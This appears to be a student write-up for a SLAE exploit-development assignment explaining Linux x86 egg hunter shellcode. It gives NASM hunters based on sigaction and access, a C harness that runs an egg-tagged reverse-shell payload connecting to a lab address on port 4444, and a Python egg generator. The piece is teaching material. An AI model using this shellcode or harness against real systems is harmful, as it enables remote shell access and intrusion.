### Assignment Three:

1. Study about the egg hunter shellcode
2. Create a working demo of the egg hunter
3. Should be configurable for different payload

What exactly is an egg hunter? When buffer overflow happens, the ESP may not always have enough amount of memory space to fit our shellcode and let use to use JMP ESP to execute it. If this happens, an egg hunter will be handy. We can just include our shellcode in some where else of the memory. Then, the egg hunter code iterate through the memory address and try to locate our egg, which is appended in front of our shellcode. If an egg is found, it will jmp to the egg and execute the rest of the shellcode. 

To make it simple, I try to write down the logic in python.
```python
count = 0
egg = 0x746f6f72 #root in reverse order

for address in range(0xffffffff):
    if address == 0x746f6f72:
        count +=1
    if count == 2:
        jmp_to_shellcode()
    address += 0x1
```

According to <http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf> there are actually a few implementation of egg hunters. Here lets try to understand them one by one.
While the egg hunter travels along the memory address it may seems that all it need is to examine each address one by one. However, the truth is that there are invalid memory address which will cause your egg hunter get a segmentation fault or other runtime error in the program. So, we will need some method to test the address we are going to compare. If it is valid, we will proceed, it not, we will ignore it.

In general, there are system call that can be use to valid an address, sigaction(0x43) and access(0x21).
Below is a proof of concept of egghunter using sigaction
```
global _start

section .text

_start:

setup:
	or cx, 0xfff		;Increase by page_size
next_address:
	inc ecx
	push byte 0x43		;Systemcall for sigation
	pop eax
	int 0x80
	cmp al, 0xf2		;f2 = invalid address
	jz setup
	
	mov eax, 0x726F6F74	;EGG = root = 726F6F74
	mov edi, ecx		;move address to edi to examine
	scasd			;check eax == edi, edi = edi+4
	jnz next_address
	scasd			;check eax == edi, edi = edi+4
	jnz next_address
	jmp edi			;execute shellcode
```

ECX is being set to end with fff every time we cannot validate the address (0xfff > 0x1000 > 0x1fff > 0x2000). This implementation is to increase ECX by page size. If the address inside a page size is invalid, the rest should be invalid too. As such, we can increase the address by page size and save sometime while searching.
Then, EAX is set to 0x43 so that we can call sigaction to help us validate the address.

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex3-2.JPG"/>
In case the address is invalid, EAX will be set to 0xfffffff2 and by checking is al equals to f2 we know that is the address valid or not. If not, we will jump back to setup and start again.

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex3-3.JPG"/>
Once a valid address is found, we will start the second part of our shellcode. We will first mov the value of our egg, "root" to eax. Then, the current address to be test will be moved from ecx to edi for testing. We will then use scasd to compare both EAX and value inside the address stored in EDI.

If two double word are not the same, we will increase ecx and test again. If yes, scasd will check the next double word to verify that this is indeed our egg. Notice that scasd, by default, will increase the address in EDI by 4 after it checked the string. So that is no need for us to increase the address value of EDI and also answered why we can just jmp EDI when the egg is found.

```
global _start

section .text

_start:
	xor edx,edx
setup:
	or dx,0xfff
next_address:
	inc edx
	lea ebx,[edx+0x4]	#Actually an optimization
	push byte +0x21
	pop eax
	int 0x80
	cmp al, 0xf2
	jz setup
	mov eax, 0x746F6F72
	mov edi, edx
	scasd
	jnz next_address
	scasd
	jnz next_address
	jmp edi	
```
<https://github.com/xMilkPowderx/SLAE-Code/blob/master/Assignment-3/access-re-egghunter.nasm>

The implementation of the access method is mostly the same as the sigaction while the access systemcall need more arguments. EBX will be needed to store the address of the string being validate. However, from the code, it seems that EBX is storing the value of EDX + 4. The reason of this is same as the page size implementation. If the value of ebx + 4 is invalid, there is no way that edx will be valid. As such according to the paper, an optimization to the shellcode.

To really test the egg hunter, I will use our reverse shell shellcode for testing.
The following sample will be using the sigaction poc
```c
#include<stdio.h>
#include<string.h>

unsigned char egg_hunter[] = "\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x74\x6f\x6f\x72\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

unsigned char egg[] = \         //reverse shell ip=192.168.170.128 port = 4444
"\x74\x6F\x6F\x72" //EGG, root
"\x74\x6F\x6F\x72"
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x89\xc6\x31\xdb\xb3\x03\xb2\x80\xc1\xe2\x08\xb2\xaa\xc1\xe2\x08\xb2\xa8\xc1\xe2\x08\xb2\xc0\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\x6a\x66\x58\xcd\x80\x87\xf3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void main(){
 printf("Length of Egg Hunter:  %d\n", strlen(egg_hunter));
 printf("Length of Shellcode:  %d\n", strlen(egg));
 int (*ret)() = (int(*)())egg_hunter;
 ret();
}
```

At last, below is python script to generate an Egg hunter generator with your custom egg.
```python
import binascii
import sys
import os
import getopt

def usage():
	print('getEgghunter.py -e egg | -h help')	

def main(argv):
	port = 0
	ip = ''
	hexPort = ''
	hexIP = ''
	if(len(sys.argv) < 2):
		usage()
		sys.exit()
	try:
		opts,args = getopt.getopt(sys.argv[1:], "he:", ["help", "egg="])
	except getopt.GetoptError:
		usage()
		sys.exit(2)
	for opt, arg in opts:
		if opt in ("-h", "--help"):
			usage()
			sys.exit()
		elif opt in ("-e", "--egg"):
			egg = arg
			print('Egg: ' + egg)
			if len(egg) != 4:
				print('Invalid Egg, length must be 4 characters')
				sys.exit(2)
	hexEgg = ''
	for char in egg:
		hexEgg = ('\\x' + bytes.decode(binascii.hexlify(str.encode(char)))) + hexEgg

	Shellcode = "\\x66\\x81\\xc9\\xff\\x0f\\x41\\x6a\\x43\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xf1\\xb8"
	Shellcode +=hexEgg 
	Shellcode +="\\x89\\xcf\\xaf\\x75\\xec\\xaf\\x75\\xe9\\xff\\xe7"
	
	print('Egghunter: ' + Shellcode)
	print('Paste this in front of your shellcode')
	print('"' + hexEgg + '"')
	print('"' + hexEgg + '"')

if __name__ == '__main__':
	main(sys.argv[1:])
